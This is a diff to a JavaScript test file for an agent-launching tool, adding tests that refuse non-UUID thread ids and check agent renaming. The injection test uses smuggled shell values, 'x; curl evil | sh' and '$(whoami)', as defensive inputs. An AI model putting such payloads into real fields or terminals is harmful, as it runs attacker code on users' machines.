@@ -126,3 +126,16 @@ test('codexCommand: an exe as it is, npm\'s script under Node, a batch wrapper t
 	assert.deepEqual(h.codexCommand({ batch: 'C:\\b\\codex.cmd' }, ['app-server'], undefined, 'E', false, 'cmd.exe'), { file: 'cmd.exe', argv: ['/d', '/s', '/c', '""C:\\b\\codex.cmd" app-server"'], verbatim: true, electronAsNode: false })
 	assert.equal(h.codexCommand({ batch: 'C:\\b%x%\\codex.cmd' }, ['app-server'], undefined, 'E', false), undefined)
 })
+
+test('a thread id that is not a uuid is refused: it would be typed into a terminal', () => {
+	const done = target => line({ method: 'externalAgentConfig/import/completed', params: { itemTypeResults: [{ itemType: 'SESSIONS', successes: [{ target }], failures: [] }] } })
+	assert.ok('error' in c.codexImportStep(done('x; curl evil | sh')))
+	assert.ok('error' in c.codexImportStep(done('$(whoami)')))
+	assert.deepEqual(c.codexImportStep(done(ID)), { thread: ID })
+})
+
+test('a moved agent keeps one arrow in its name', () => {
+	assert.equal(c.swappedName('Claude 2', 'Codex'), 'Claude 2 → Codex')
+	assert.equal(c.swappedName('Claude 2 → Codex', 'Claude'), 'Claude 2 → Claude')
+	assert.equal(c.swappedName('Claude 2 → Claude', 'Codex'), 'Claude 2 → Codex')
+})
